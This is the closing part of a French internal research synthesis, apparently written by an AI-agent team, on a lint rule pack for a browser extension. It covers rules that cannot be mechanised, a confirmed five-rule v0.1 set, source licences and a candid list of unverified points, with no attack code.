| User Data disclosure form / Limited Use certification | formulaire dashboard, hors manifest/bundle | axe 2 |
| Publicité ciblée/re-ciblage à partir de données utilisateur | comportement runtime/serveur, invisible dans le manifest | axe 2 |
| Absence d'envoi de contenu DOM (exfiltration via lecture DOM puis envoi différé) | indiscernable statiquement — un `document.body.innerText` lu puis rendu localement vs envoyé au réseau 3 fonctions plus loin nécessite audit data-flow dynamique | axe 5 |
| `chrome.storage` "local" nommé local-first — le nom ne garantit rien | seule l'absence corrélée de toute destination réseau valide la promesse ; le nom de l'API est une indication d'intention, pas une preuve de comportement | axe 5 |
| Historique git « propre » à l'instant T | un commit ultérieur peut toujours introduire de l'exfiltration — preuve d'état qui périme (`derive-never-type.md`) | axe 5 |
| Fetch/XHR/WebSocket vers URL construite dynamiquement (concat, template, décodage base64) | grep statique ne peut pas suivre le data-flow d'une URL assemblée à l'exécution — **limite documentée explicitement, pas taboue** | axe 5 — **cas réel non résolu dans notre propre bundle ce soir : 3 `fetch()` à argument dynamique** |
| Rachat/changement de mainteneur suivi d'un bump de permissions | mécanisable uniquement sur des dépendances tierces via changelog/diff de versions publiées — pas mécanisable sur notre propre repo | axe 5 |
| `coexistence-collision` (T0 §2.2) | problème de correspondance sémantique inter-fichiers de tests à des dates différentes — un premier jet mécanique produirait un taux FP/FN élevé sans données de calibration suffisantes | T0 |
| `test-cannot-fail` (T0 §2.2) | détection statique insuffisante seule — la preuve définitive exige une infrastructure de mutation-testing sur code tiers qui n'existe pas encore | T0 |
| `verified-not-activated` (T0 §2.2) | mécanique en soi mais bloquée : dépend d'un artefact de build-hash qui n'existe pas comme convention dans le pipeline actuel | T0 |

**Honnêteté explicite** : c'est la limite de l'outil, pas un échec de conception — chaque ligne ci-dessus est documentée avec la raison précise de son exclusion, jamais un simple « pas fait ».

---

## §5 — RECOMMANDATION v0.1

**Le T0 défendait 5 règles v0.1 : `net-broadcast-unfiltered`, `sw-context-invalidated-guard`, `i18n-key-coverage-gap`, `custom-element-orphan-registration`, `unused-file-export` (fusion `unused-export`/`unused-file`).**

**Verdict : JE CONFIRME les 5, sans révision, à la lumière de la matrice complète.**

Argumentation croisée avec les 4 axes supplémentaires (le T0 n'avait accès qu'à dot-skills + son propre historique VP, pas encore à addons-linter/CWS/concurrence/sécurité) :

1. Ces 5 règles restent les **seules du TOP-30 entier** à porter un MUST_BLOCK confirmé sur du matériau réellement produit dans notre propre codebase **le soir même ou dans un historique VP daté** — pas une mutation à injecter, pas un cas hypothétique. C'est le critère le plus strict de tout le corpus des 5 documents.
2. Aucune des règles ajoutées par les 4 nouveaux axes (manifest/permissions/CSP/remote-code/secrets — 18 nouvelles entrées §1.1) n'a de MUST_BLOCK réel confirmé sur notre propre produit : la plupart sont classées « conforme » ou « à vérifier » (axe 2 §Application, axe 5 §Audit de notre propre produit) — c'est-à-dire qu'elles n'ont **pas encore de preuve de morsure**, condition non-négociable posée par T0 §4 (« sonde bipolaire obligatoire, MUST_BLOCK avant merge dans le pack »).
3. Deux candidates seraient tentantes à ajouter en v0.1 (`description-permission-mismatch` et `permission-required-vs-optional` — toutes deux VD réels confirmés sur notre manifest actuel par axe 2), mais elles restent en v0.2 pour une raison précise et honnête : leur MUST_PASS n'a **pas encore d'exemple confirmé** dans notre codebase (aucun cas de description/permission correctement alignée n'a été isolé et testé comme cas légitime dans les documents source — seul le cas défectueux est prouvé). Une règle sans MUST_PASS n'est pas mieux calibrée qu'une règle sans MUST_BLOCK (doctrine `hook-vitality-bite-probe.md`, bipolaire obligatoire).
4. `style-file-kebab-case` reste hors v0.1 malgré un MUST_BLOCK réel confirmé (3 fichiers dot-skills) — c'était déjà le choix argumenté du T0 (« cosmétique/dette, pas de risque runtime »), confirmé par les 4 nouveaux axes qui n'apportent aucun signal contredisant cette priorisation basse (aucune source ne classe le style de nommage comme facteur de rejet CWS ou risque sécurité).

**Conclusion §5** : la matrice complète, 5× plus large que celle disponible au moment du T0, ne fait que renforcer le choix initial — les 5 règles v0.1 sont précisément celles qui satisfont le critère le plus dur (« 5 règles qui mordent valent mieux que 40 qui bruissent »), et aucune candidate nouvelle ne l'égale encore sur cette barre bipolaire.

---

## §6 — LICENCES ET ATTRIBUTION

| Source | Licence (vérifiée dans quel document) | Règle d'usage |
|---|---|---|
| dot-skills (pproenca/dot-skills) | MIT (citée par T0 §6, non re-vérifiée directement par l'auteur du T0 lui-même — voir §7 ci-dessous, contradiction potentielle à trancher) | Attribution en-tête + `NOTICE` consolidé si code dérivé. Ce document (état de l'art) ne reprend aucun code, seulement la taxonomie des règles. |
| addons-linter (Mozilla) | **MPL-2.0** — vérifiée directement par axe 1 (`Lecture de LICENSE à la racine du repo cloné, SHA db595c66a3d37055a92b24fe31cfac6a0017b274`) — weak copyleft fichier-par-fichier | AUCUNE copie de code. Seule l'idée/taxonomie des règles est portée. Si du code venait un jour à être copié, ce fichier resterait sous MPL-2.0 isolément. |
| react-doctor (Million Software, Inc.) | Modified MIT | Aucune ligne de code portée, aucun clone. Uniquement observation de sortie observable (score, findings, catégories) via usage normal du produit publié — confirmé explicitement par T0 §6 et par axe 4 §Confirmation contrainte react-doctor. |
| Politiques Chrome Web Store (Google) | Faits publics, non protégés (politiques de plateforme) | Citation directe des exigences officielles avec URL `developer.chrome.com`, aucune question de licence — ce sont des règles de plateforme, pas du code. |
| web-ext / crx-analyzer / ExtAnalysis / source-map-explorer / webpack-bundle-analyzer / depcheck (axe 4) | MPL-2.0 / GPL-3.0 / GPL-3.0 / Apache-2.0 / MIT / MIT respectivement (chaque licence vérifiée par `npm view <pkg> license` ou lecture README GitHub, citée ligne par ligne dans axe 4) | Aucun code repris d'aucun de ces 6 outils — uniquement des **concepts d'ergonomie CLI** observés (ex. treemap de webpack-bundle-analyzer comme référence UX, jamais son code). GPL-3.0 (crx-analyzer, ExtAnalysis) explicitement notée comme "concept seulement, pas de réutilisation de code" par axe 4. |

**Décision Pi actée (rappel du brief, reprise ici sans modification)** : notre licence = notre texte, style react-doctor (MIT + clause usage commercial sur autorisation), zéro ligne copiée d'aucune source. Chaque règle du futur pack portera sa source d'inspiration en commentaire (URL), jamais de code emprunté.

---

## §7 — NON VÉRIFIÉ

Reprise honnête des trous déclarés dans les 6 fragments, jamais lissée :

1. **Sévérité exacte (error/warning/notice) pour ~77 des 119 messages addons-linter** n'a pas pu être résolue par recherche textuelle de proximité — nécessite une analyse de flux de données (dataflow/AST) que l'axe 1 n'a pas exécutée, explicitement nommé comme hors scope de cette recherche par le document source lui-même.
2. **Le contenu exact de la licence dot-skills** (MIT) n'a jamais été re-vérifié directement par l'auteur du T0 (« je m'appuie sur l'affirmation du brief de dispatch sans avoir moi-même exécuté `head -5 LICENSE` ») — reste à revérifier avant tout usage effectif du contenu dot-skills en T1. **Cette tâche de synthèse n'a pas non plus re-vérifié cette licence** (contrainte du brief : zéro nouvelle recherche).
3. **Faisabilité réelle de la détection de framework JSX Preact vs React en amont des règles UI** (T0 §3) — préconisation de conception, pas prototypée, à valider en T1/T2.
4. **Taux réel de faux positifs/négatifs de `coexistence-collision`** — un seul incident réel documenté (Day 137 soir même) ne constitue pas un jeu de calibration suffisant, explicitement nommé hors scope v0.1 par T0.
5. **Convention `qa/dom-snapshots/<host>/`** requise par `host-signal-unverified` — n'existe pas aujourd'hui dans le repo, proposition de prérequis non constatée.
6. **Existence d'un build-hash inséré au packaging** (requis par `verified-not-activated`) — supposée absente sur la base du brief, non confirmée par lecture directe de `vite.config.ts` par T0.
7. **Scan du bundle produit (`dist/**`) pour la détection d'obfuscation** (axe 2) — non exécuté par axe 2 (contrainte de son périmètre : aucune modification/build autorisée dans cette tâche), **mais partiellement comblé par axe 5** qui, lui, a exécuté un vrai build et audité le bundle (`dist/chrome`, 17 fichiers, zéro eval/remote code confirmé). Les deux axes se complètent sans se contredire : axe 2 documente la règle théorique, axe 5 l'exécute réellement sur notre produit.
8. **Justification écrite de `alarms` et `unlimitedStorage`** dans le dashboard CWS — ce champ n'existe pas dans le repo, non vérifiable depuis un worktree.
9. **Statut réel de la privacy policy publiée** (`gptpowerups.com/en/privacy`) — mentionnée dans un doc antérieur du repo, non re-`curl`ée par axe 2 dans cette recherche.
10. **Résolution des 3 arguments dynamiques de `fetch()`** trouvés par axe 5 dans le bundle réel (`e.content`, `_`, `n.content`) — cohérents avec un usage `blob:`/`data:` local (pattern `.blob()` qui suit) mais non exclus formellement sans lecture du code source non minifié ou instrumentation runtime réelle.
11. **Postinstall bloqué signalé par `bun install`** ce soir même (« Blocked 1 postinstall ») — non investigué par axe 5, resté en l'état.
12. **Build Firefox** (`vite build --mode firefox`) — non exécuté par axe 5, seul le build Chrome a été audité ; les CSP/permissions MV3 Firefox peuvent différer légèrement.
13. **Licence exacte de CRXcavator** avant sa fermeture 2023 — service mort, code source non retrouvé publiquement par axe 4, traité comme « non déterminé » plutôt que supposé.
14. **Existence d'un concurrent direct non indexé** (outil interne à une agence jamais publié) — aucune recherche documentaire ne peut prouver ce négatif, risque resté ouvert par axe 4.
15. **La contradiction de compte T0 « 20 » vs 19 lignes/18 ids dérivés** (§0 ci-dessus) — non tranchée : je ne peux pas savoir si le brief de dispatch original du T0 a compté différemment (peut-être en incluant `score-scope-provenance` comme contrainte CLI séparée du compte de "règles"), ni retrouver l'origine exacte du chiffre 20. Signalé, non lissé, à trancher par Chi/Pi si le chiffre exact importe pour la suite.

---

Orchestrator: Chi — VantageOS Team | 2026-07-17
